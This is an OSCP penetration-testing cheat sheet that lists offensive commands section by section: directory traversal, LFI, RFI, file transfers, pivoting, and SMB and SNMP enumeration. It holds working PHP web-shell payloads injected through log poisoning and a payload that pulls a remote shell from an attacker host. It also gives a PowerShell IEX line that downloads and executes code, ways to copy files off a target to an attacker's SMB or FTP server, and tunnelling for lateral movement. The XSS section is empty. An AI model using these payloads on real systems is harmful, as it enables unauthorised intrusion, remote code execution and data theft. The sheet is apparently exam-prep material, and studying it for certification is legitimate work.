# OSCP Cheat Sheet by 0xpr0N3rd

## Directory Traversal & LFI

### Directory Traversal

**IMPORTANT:** Find the **VULNERABLE** parameter **FIRST**.

Read sample file on **Windows**:

```
vuln.php?param=c:\windows\system32\drivers\etc\hosts
```

Read sample file on **Linux**:

```
vuln.php?param=/etc/hosts
```

## 

### Local File Inclusion

**First**, Locate the **VULNERABLE** parameter.

**Second**, try to do **Log Poisoning**:

```
User-Agent: <?php system($HTTP_GET_VARS[cmd]) ?><?php die ?>

or 

User-Agent: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

**NOTE:** This injection is also possible if there's FTP installed on the box.

**Third**, look again to the log files:

**Windows:**

```
vuln.php?param=c:\xampp\apache\logs\access.log
```

**Linux:**

```
vuln.php?param=/var/log/apache2/access.log
```

**Fourth**, perform LFI:

**Windows:**

```
vuln.php?param=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

**Linux:**

```
vuln.php?param=/var/log/apache2/access.log&cmd=whoami
```

### IF POSSIBLE, TRY TO HIT AN RFI

Perform Log Poisoning first.

Then:

```
User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://<LHOST>/shell.php'))?>
```

### ANOTHER METHOD, PHP FILE WRAPPERS

```
vuln.php?param=data:text/plain, hello world
```

**Injection:**

```
vuln.php?param=data:text/plain, <?php echo shell_exec("cmd") ?>
```

### IMPORTANT NOTE

If we are not able to read some ``.php`` files with either Directory Traversal or LFI, it may be happening because ``http://wrapper`` is disabled in the server configuration by setting ``allow_url_include`` to ``0``.

What we can try is:

```
vuln.php?param=ftp://<FILE_NAME>

or

vuln.php?param=expect://<COMMAND>
```

OR

```
vuln.php?param=php://filter/convert.base64-encode/resource=<FILE_NAME>
```

### PHP Info LFI

[See](https://github.com/0xpr0N3rd/OSCP-Prep/blob/main/HTB-Boxes/Linux-Boxes/2%20-%20Poison%20(Medium).md)

-------------------------------------------------------------

## File Transfers

### Method 1 (SMB Server) | Windows -> Linux

On **LOCAL**, first set up the ``/etc/samba/smb.conf`` file as follows (add on bottom of the page):

```
[SHARE_NAME]
   comment = File Drop
   path = <PATH_TO_SOURCE_DIR>
   browseable = yes
   read only = no
   guest ok = yes
```

Second, again on **LOCAL**, set up the server:

```
# smbserver.py <SHARE_NAME> $(pwd) -port <LPORT>          <- Port is optional

or

# impacket-smbserver <SHARE_NAME> $(pwd) -port <LPORT>    <- Port is optional
```

On **TARGET**:

```
PS C:\> copy <FILE_NAME> \\<LHOST>\<SHARE_NAME>\<OUTPUT_FILE_NAME>
```

## 

### Method 2 (Web ROOT) | Windows -> Linux

If you have the permission for copying the file to the webroot, copy the file to the server & download the file on **LOCAL**.

##

### Method 3 (FTP, works almost EVERYTIME) | Windows -> Linux

On **LOCAL**:

```
# pip install pyftpdlib

# python -m pyftpdlib -p 21 -w         <- "-w" flag enables anonymous write permission
```

On **TARGET**:

```
PS C:\> C:\Windows\System32\ftp.exe
ftp> open <LHOST>
ftp> user anonymous
ftp> password <BLANK>
ftp> put <FILE_NAME>
```

##

### Method 4 (SMB Server) | Linux -> Windows

On **LOCAL**, first set up the ``/etc/samba/smb.conf`` file as follows (add on bottom of the page):

```
[SHARE_NAME]
   comment = File Drop
   path = <PATH_TO_SOURCE_DIR>
   browseable = yes
   read only = no
   guest ok = yes
```

Second, on **LOCAL**:

```
# smbserver.py <SHARE_NAME> . -smb2support               <- if gives error, try installing impacket again: pip3 install . (in impacket folder)

or

# impacket-smbserver <SHARE_NAME> $(pwd) -smb2support -user <USENAME> -password <PASSWORD>      <- username, password & smb2support flags are optional
```

On **TARGET**:

```
PS C:\> $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('test', $pass)
PS C:\> New-PSDrive -Name "<SHARE_NAME>" -PSProvider "FileSystem" -Root "\\<LHOST>\<SHARE_NAME>" -Credential $cred


PS C:\> net use \\<LHOST>\<SHARE_NAME>
PS C:\> net use copy \\<LHOST>\<SHARE_NAME>\<FILE_NAME>
```

##

### Method 5 (Standard IEX) | Linux -> Windows

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
PS C:\> IEX(New-Object Net.WebClient).downloadString('http://<LHOST>:<LPORT>/<FILE_NAME>')
PS C:\> Get-ChildItem -Path C:\ -Include <FILE_NAME> -Recurse        <- Find downloaded file (recursively)
```

##

### Method 6 (Powershell) | Linux -> Windows

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
PS C:> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<LHOST>:<LPORT>/<FILE_NAME>', 'C:\Users\Public\Downloads\<FILE_NAME>')"
```

##

### Method 7 (Browser) | Linux -> Windows

If there's a RDP or VNC connection, use browser on navigating the files.

##

### Method 8 (Standard wget) | Linux -> Linux

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
# wget http://<LHOST>:<LPORT>/<FILE_NAME>
```

##

### Method 9 (SCP) | Linux -> Linux

On **LOCAL**:

```
# scp <FILE_NAME> <USERNAME>@<RHOST>:/<REMOTE_DIR>
```

##

### Method 10 (Socat) | Linux -> Linux

On **LOCAL**:

```
# socat TCP4-LISTEN:<LPORT>,fork file:<FILE_NAME>
```

On **TARGET**:

```
# socat TCP4:<LHOST>:<LPORT> file:<FILE_NAME>, create
```

-------------------------------------------------------------

### File Servers

**Python 2.x:**

```
# python -m SimpleHTTPServer <LPORT>
```

**Python 3.x:**

```
# python3 -m http.server <LPORT>
```

**PHP:**

```
# php -S 0.0.0.0:<LPORT>
```

**Ruby:**

```
# ruby -run -e httpd . -p <LPORT>
```

**Busybox:**

```
# busybox httpd -f -p <LPORT>
```

-------------------------------------------------------------

## NFS

**Scan for NFS NSE scripts:**

```
# nmap -p 111 -sV -sC -vv --script nfs* <RHOST>

or

# nmap -p 111 -sV -sC -vv --script=rpcinfo <RHOST>
```

**Mount a share:**

```
# mkdir <RSHARE>
# mount -o nolock <RHOST>:/<RSHARE> <PATH_TO_RSHARE_ON_LOCAL>
```

**Unmount a share:**

```
# umount <RHOST>:/<RSHARE> <PATH_TO_RSHARE_ON_LOCAL>

or

# umount -f -l <PATH_TO_RSHARE_ON_LOCAL>
```

-------------------------------------------------------------

## Port Forwarding 

### Port Forwarding w/ProxyChains | UNIX

**First**, on **LOCAL** set up ``/etc/proxychains.conf`` file:

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 <LISTEN_PORT>
```

**Second**, on **LOCAL**, do the **Dynamic** port forwarding. This forwards all target ports through the tunnel to our local:

```
# ssh -f -N -D 127.0.0.1:<LISTEN_PORT> <USERNAME>@<RHOST>
```

**Third**, for instance, to perform **NMAP** through the tunnel, do:

```
# proxychains -q nmap -sV -Pn --top-ports 20 -sC -sT -vv <RHOST>        <- Remember "-sT" flag is a must since nmap can only scan TCP ports through proxychains 
```

**NOTE:**

- If **NMAP** scan would take too long, just do:

```
# nc -nvv -w 1 -z <RHOST> <PORT_RANGE>
```

from the **PIVOTED** box to perform a netcat port scan.

**NOTE 2:**

- If both ``proxychains`` and ``nc`` would take too long, try to upload **[nmap static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)** to the **PIVOT** box and run **nmap**.

**Fourth**, to perform **GOBUSTER** scan, do:

```
# gobuster dir -p socks5://127.0.0.1:<LISTEN_PORT> -u http://<RHOST>:<RPORT>/ -w <WORDLIST> -x <EXTENSIONS> -t 200
```

**Fifth**, to perform **WFUZZ**, do:

```
# wfuzz -p 127.0.0.1:<LISTENPORT>:SOCKS5 -c -w <WORDLIST> --hc 404 http://<RHOST>:<RPORT>/FUZZ   <- If there's an error, use SOCKS4 (configure SOCKS4 also)
```

**Sixth**, to redirect tunneled traffic on the **BROWSER**, do:

1. Open **FoxyProxy** settings
2. Select **Proxy Type** as ``SOCKS4`` or ``SOCKS5``
3. Select **Proxy IP address** as ``127.0.0.1``
4. Select **Port** as ``<LISTEN_PORT>``

##

### Port Forwarding w/PLINK.exe | Windows

***Upload*** ``plink.exe`` ***to the box. Preferably, under*** ``C:\Public\Downloads\`` ***location.***

**SOCKS-based Dynamic Port Forwarding**

```
C:\> plink.exe -N -D 127.0.0.1:<LHOST> -P <SSH PORT> <RHOST>
```

**Forward local host to remote address:**

```
C:\> plink.exe -ssh -l <REMOTE_SSH_USERNAME> -pw <PASSWORD> <RHOST>:<RPORT>:127.0.0.1:<LPORT> <RHOST>
```

**Forward local when a dedicated SOCKS proxy server is available:**

```
C:\> plink.exe -N -L <LHOST>:<SOCKS_IP>:<SOCKS_PORT>
```

**Remote Port Forwarding:**

```
C:\> plink.exe -N -R <LPORT>:127.0.0.1:<RPORT> -P 22 <RHOST>
```

**Nmap:**

```
# nmap -sS -sV 127.0.0.1 -p <PORT>
```

##

### Port Forwarding w/NETSH.exe | Windows**

**Establish connection:**

```
C:\> netsh interface portproxy add v4tov4 listenport=<LHOST> listenaddress=<LPORT> connectport=<RPORT> connectaddress=<RHOST>
```

**Check routing table *(from CMD, not PS)*:**

```
C:\> netstat -anp TCP | find <LPORT>
```

**Add firewall:**

```
C:\> netsh advfirewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<RHOST> localport=<RPORT> action=allow
```

##

### Port Forwarding w/Metasploit

```
meterpreter> portfwd add –l <LPORT> –p <RPORT> –r <RHOST>

meterpreter> portfwd delete –l <LPORT> –p <RPORT> –r <RHOST>

```

##

### Double Pivoting w/SSH

Consider you want to pivot from **"Network A"** to **"Network B"**. Then, from **"Network B"**, you want to pivot to **"Network C"**

**TL;DR -> Pivot from A to B and B to C.** 

First, set up an **SSH Local Port Forwarding** from the second pivot point ***(Network B)*** to the first pivot point ***(Network A)***:

```
# ssh -f -N -L <BIND_PORT>:<RHOST_OF_C>:<RPORT_TO_FORWARD_FROM_C> <USER_OF_B>@<RHOST_OF_B>
```

Then, after establishing a connection from **Network C**, simply create an SSH tunnel from **Network B** to **Network A** by **SSH Dynamic Port Forwarding**:

```
# ssh -f -N -p <BIND_PORT> -D <NEW_BIND_PORT> <USER_OF_C>@127.0.0.1
```

**Note:** Don't forget to add new entry to your ``/etc/proxychains.conf`` file for new bind port.

-------------------------------------------------------------

## Remote File Inclusion

Identify the **VULNERABLE** parameter.

Then start a simple python web server or nc listener and do:

```
vuln.php?param=http://<LHOST>/randomfile
```

Check if there's a request popped up in web server or nc listener.

-------------------------------------------------------------

## SMB

**Nmap:**

```
# nmap -sV -sC -vv -p 139,445 <RHOST>
```

**NBTSCAN *(for NetBIOS Service, Port 139)*:**

```
# nbtscan -r <RHOST>/<SUBNET>
```

**Nmap NSE Scripts:**

```
# nmap -sV -sC -vv -p 139,445 --script smb* <RHOST>
```

**enum4linux:**

```
# enum4linux -a <RHOST>
```

**SMBClient:**

```
# smbclient -L //<RHOST>

# smbclient //<RHOST>/<SHARE>
```

-------------------------------------------------------------

## SNMP

**Nmap:**

```
# nmap -sU --open -p 161 <RHOST>
```

**Onesixtyone:**

```
# onesixtyone -c community -i <IP_LIST>
```

**Enumeration:**

```
# snmpwalk -c <COMMUNITY_STRING> -v <SNMP_VERSION> -t <TIMEOUT_PERIOD> <RHOST>
```

-------------------------------------------------------------

## XSS







